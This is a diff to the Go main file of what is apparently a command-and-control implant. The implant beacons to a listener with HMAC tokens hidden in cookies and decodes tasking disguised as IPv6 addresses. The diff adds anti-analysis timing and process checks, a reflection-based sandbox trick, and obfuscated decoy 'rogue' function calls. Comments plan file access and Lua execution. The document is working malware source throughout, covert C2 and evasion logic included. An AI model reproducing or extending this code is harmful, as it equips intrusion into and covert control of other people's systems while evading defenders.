@@ -1,13 +1,16 @@
 package main
 
 import (
+	"0xo0xo0xo0xo0/z/anti"
+	"0xo0xo0xo0xo0/z/rogue"
+	"0xo0xo0xo0xo0/z/shared"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/matt-culbert/proto-daemon/Implant/shared"
 	"io"
 	"log"
 	"net/http"
+	"reflect"
 )
 
 // ResponseData Struct to hold the response format from the server
@@ -26,183 +29,203 @@ var PostURI string
 // GetURI The GET URI to use, varies on if auth is enabled or not
 var GetURI string
 
+type secret struct {
+	hiddenField bool
+}
+
+func runTimeCheck() bool {
+	hidden := secret{hiddenField: true}
+	v := reflect.ValueOf(hidden)
+	return v.Field(0).Bool()
+}
+
 func main() {
-	// Load configuration from embedded data
-	conf, err := shared.LoadConfig()
-	if err != nil {
-		log.Fatalf("Failed to load config: %v", err)
-	}
+	anti.TimingCheck()
+	anti.KillTheChild()
+	switch runTimeCheck() {
+	case false:
+		rogue.Func549687354()
+		rogue.FuncDF7858354()
+	case true:
+		// Load configuration from embedded data
+		conf, err := shared.LoadConfig()
+		if err != nil {
+			log.Fatalf("Failed to load config: %v", err)
+		}
 
-	maxRetries := 3
+		maxRetries := 3
 
-	for {
-		baseUrl := ""
-		baseUrl = "http://" + conf.Listener + GetURI
-		postUrl := ""
-		postUrl = "http://" + conf.Listener + PostURI
+		for {
+			baseUrl := ""
+			baseUrl = "http://" + conf.Listener + GetURI
+			postUrl := ""
+			postUrl = "http://" + conf.Listener + PostURI
 
-		token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)
+			token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)
 
-		//reqURL, _ := url.Parse(baseUrl)
+			//reqURL, _ := url.Parse(baseUrl)
 
-		// Prepare the hmac params (timestamp and token)
-		// params := http.Cookie{}
-		hardVals := fmt.Sprintf("timestamp=%s&token=%s&id=%s", timestamp, token, CompUUID)
+			// Prepare the hmac params (timestamp and token)
+			// params := http.Cookie{}
+			hardVals := fmt.Sprintf("timestamp=%s&token=%s&id=%s", timestamp, token, CompUUID)
 
-		// compedData is hardVals compressed using zlib
-		// if enabled at compile time, DoComp returns the compressed object and bool true
-		// if disabled (default) the function returns false
-		// if false, the params are instead appended to the request uncompressed
-		compedData, shouldComp := shared.DoComp(hardVals)
-		if shouldComp {
-			//fmt.Println(hardVals)
-			encodedData := base64.StdEncoding.EncodeToString(compedData.Bytes())
-			// "da" can be changed to a randomly chosen string to cycle through
-			tokenCookie := &http.Cookie{Name: "da", Value: encodedData}
-			// makeGetRequest 3 times with a 10 second delay between each attempt
-			// if the request is successful, break the loop
-			// otherwise, the 3 timeouts cause the program to exit
-			resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie)
-			if err != nil {
-				return
-			}
-			// Defer closing the response body until the for loop breaks
-			defer func(Body io.ReadCloser) {
-				err := Body.Close()
+			// compedData is hardVals compressed using zlib
+			// if enabled at compile time, DoComp returns the compressed object and bool true
+			// if disabled (default) the function returns false
+			// if false, the params are instead appended to the request uncompressed
+			compedData, shouldComp := shared.DoComp(hardVals)
+			// anti.TimingCheck()
+			if shouldComp {
+				//fmt.Println(hardVals)
+				encodedData := base64.StdEncoding.EncodeToString(compedData.Bytes())
+				// "da" can be changed to a randomly chosen string to cycle through
+				tokenCookie := &http.Cookie{Name: "da", Value: encodedData}
+				// makeGetRequest 3 times with a 10 second delay between each attempt
+				// if the request is successful, break the loop
+				// otherwise, the 3 timeouts cause the program to exit
+				resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie)
 				if err != nil {
 					return
 				}
-			}(resp.Body)
+				// Defer closing the response body until the for loop breaks
+				defer func(Body io.ReadCloser) {
+					err := Body.Close()
+					if err != nil {
+						return
+					}
+				}(resp.Body)
 
-			// Check the response status
-			if resp.StatusCode != http.StatusOK {
-				// non-OK http status
-				break
-			}
-
-			// Read the response body
-			body, err := io.ReadAll(resp.Body)
-			if err != nil {
-				// reading response body failed
-				break
-			}
-
-			// Parse the JSON response
-			var data ResponseData
-			err = json.Unmarshal(body, &data)
-			if err != nil {
-				// parsing json failed
-				break
-			}
-
-			// Print the values (for testing)
-			// fmt.Println("Message:", data.Message)
-			// fmt.Println("Key:", data.Key)
-
-			// The response comes encoded in a hex format that mimics IPv6 IPs
-			// Decode that data
-			decoded, err := shared.DecodeIPv6ToString(data.Message)
-			if err != nil {
-				fmt.Println(err)
-				break
-			}
-			fmt.Println("Decoded string:", decoded)
-
-			// Verify the message with the received HMAC
-			if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
-				fmt.Println("HMAC is valid!")
-				// Here is where command processing should occur
-				// A switch statement to run through possible command options, including using the lua engine
-				// List arbitrary dir, read file, write file, execute Lua
-				// Returns the result of execution (stdout or bool) or returns an error
-
-				impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
-				err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
-				if err != nil {
-					return
+				// Check the response status
+				if resp.StatusCode != http.StatusOK {
+					// non-OK http status
+					break
 				}
-				break
 
-			} else {
-				fmt.Println("HMAC is invalid or message was tampered with.")
-				break
-			}
-		} else {
-			//fmt.Println("Not compressing data")
-			tokenCookie := &http.Cookie{Name: "token", Value: token}
-			timestampCookie := &http.Cookie{Name: "timestamp", Value: timestamp}
-			impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
-			//reqURL.RawQuery = params.Encode()
-			//fmt.Println(reqURL.String())
-			// makeGetRequest 3 times with a 10-second delay between each attempt
-			// if the request is successful, break the loop
-			// otherwise, the 3 timeouts cause the program to exit
-			resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie, timestampCookie, impIdCookie)
-			if err != nil {
-				//fmt.Println("Final error:", err)
-				return
-			}
-			// Defer closing the response body until the for loop breaks
-			defer func(Body io.ReadCloser) {
-				err := Body.Close()
+				// Read the response body
+				body, err := io.ReadAll(resp.Body)
 				if err != nil {
-					return
+					// reading response body failed
+					break
 				}
-			}(resp.Body)
 
-			// Check the response status
-			if resp.StatusCode != http.StatusOK {
-				// non-OK http status
-				break
-			}
+				// Parse the JSON response
+				var data ResponseData
+				err = json.Unmarshal(body, &data)
+				if err != nil {
+					// parsing json failed
+					break
+				}
 
-			// Read the response body
-			body, err := io.ReadAll(resp.Body)
-			if err != nil {
-				// reading response body failed
-				break
-			}
+				// Print the values (for testing)
+				// fmt.Println("Message:", data.Message)
+				// fmt.Println("Key:", data.Key)
 
-			// Parse the JSON response
-			var data ResponseData
-			err = json.Unmarshal(body, &data)
-			if err != nil {
-				// parsing json failed
-				break
-			}
-
-			// Print the values (for testing)
-			// fmt.Println("Message:", data.Message)
-			// fmt.Println("Key:", data.Key)
-
-			// The response comes encoded in a hex format that mimics IPv6 IPs
-			// Decode that data
-			_, err = shared.DecodeIPv6ToString(data.Message)
-			if err != nil {
-				//fmt.Println(err)
-				break
-			}
-			//fmt.Println("Decoded string:", decoded)
-
-			// Verify the message with the received HMAC
-			switch shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
-			case true:
-				fmt.Println("HMAC is valid!")
-				// Here is where command processing should occur
-				// A switch statement to run through possible command options, including using the lua engine
-				// List arbitrary dir, read file, write file, execute Lua
-				// Returns the result of execution (stdout or bool) or returns an error
-
-				impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
-				err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
+				// The response comes encoded in a hex format that mimics IPv6 IPs
+				// Decode that data
+				decoded, err := shared.DecodeIPv6ToString(data.Message)
 				if err != nil {
 					fmt.Println(err)
+					break
 				}
-				break
+				fmt.Println("Decoded string:", decoded)
 
-			case false:
-				fmt.Println("HMAC is invalid or message was tampered with.")
-				break
+				// Verify the message with the received HMAC
+				if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
+					fmt.Println("HMAC is valid!")
+					// Here is where command processing should occur
+					// A switch statement to run through possible command options, including using the lua engine
+					// List arbitrary dir, read file, write file, execute Lua
+					// Returns the result of execution (stdout or bool) or returns an error
+
+					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
+					err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
+					if err != nil {
+						return
+					}
+					break
+
+				} else {
+					fmt.Println("HMAC is invalid or message was tampered with.")
+					break
+				}
+			} else {
+				//fmt.Println("Not compressing data")
+				tokenCookie := &http.Cookie{Name: "token", Value: token}
+				timestampCookie := &http.Cookie{Name: "timestamp", Value: timestamp}
+				impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
+				//reqURL.RawQuery = params.Encode()
+				//fmt.Println(reqURL.String())
+				// makeGetRequest 3 times with a 10-second delay between each attempt
+				// if the request is successful, break the loop
+				// otherwise, the 3 timeouts cause the program to exit
+				resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie, timestampCookie, impIdCookie)
+				if err != nil {
+					//fmt.Println("Final error:", err)
+					return
+				}
+
+				// Defer closing the response body until the for loop breaks
+				defer func(Body io.ReadCloser) {
+					err := Body.Close()
+					if err != nil {
+						return
+					}
+				}(resp.Body)
+
+				// Check the response status
+				if resp.StatusCode != http.StatusOK {
+					// non-OK http status
+					break
+				}
+
+				// Read the response body
+				body, err := io.ReadAll(resp.Body)
+				if err != nil {
+					// reading response body failed
+					break
+				}
+
+				// Parse the JSON response
+				var data ResponseData
+				err = json.Unmarshal(body, &data)
+				if err != nil {
+					// parsing json failed
+					break
+				}
+
+				// Print the values (for testing)
+				// fmt.Println("Message:", data.Message)
+				// fmt.Println("Key:", data.Key)
+
+				// The response comes encoded in a hex format that mimics IPv6 IPs
+				// Decode that data
+				_, err = shared.DecodeIPv6ToString(data.Message)
+				if err != nil {
+					//fmt.Println(err)
+					break
+				}
+				//fmt.Println("Decoded string:", decoded)
+
+				// Verify the message with the received HMAC
+				switch shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
+				case true:
+					fmt.Println("HMAC is valid!")
+					// Here is where command processing should occur
+					// A switch statement to run through possible command options, including using the lua engine
+					// List arbitrary dir, read file, write file, execute Lua
+					// Returns the result of execution (stdout or bool) or returns an error
+
+					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
+					err = shared.SendDataRequest(postUrl, "test success", maxRetries, impIdCookie)
+					if err != nil {
+						fmt.Println(err)
+					}
+					break
+
+				case false:
+					fmt.Println("HMAC is invalid or message was tampered with.")
+					break
+				}
 			}
 		}
 	}
